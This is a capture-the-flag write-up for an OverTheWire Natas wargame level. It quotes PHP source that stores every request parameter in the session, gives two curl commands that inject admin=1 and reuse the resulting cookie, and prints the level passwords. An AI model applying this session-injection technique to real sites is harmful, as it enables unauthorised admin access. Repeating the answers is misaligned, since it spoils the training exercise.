# Natas 20 - Natas 21

    Username  : natas20
    Password  : p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw
    URL       : http://natas20.natas.labs.overthewire.org

# Solution
In the main page you can see that 
```
Note: this website is colocated with http://natas21-experimenter.natas.labs.overthewire.org

You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.

```
Visiting the colocated website and viewing the source code :
```
<?php

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```
We are going to use 2 curl commnd :

      curl -c cookies.txt -d "admin=1&submit=Update" -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH http://natas21-experimenter.natas.labs.overthewire.org/

This command is used for pushing admin = 1 and store the cookie in a file

    curl -b cookies.txt -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH http://natas21.natas.labs.overthewire.org/

This command is trying to login with the cookie discovered in the previous step

# Password
     d8rwGBl0Xslg3b76ez3S7e1U8xwODGs8
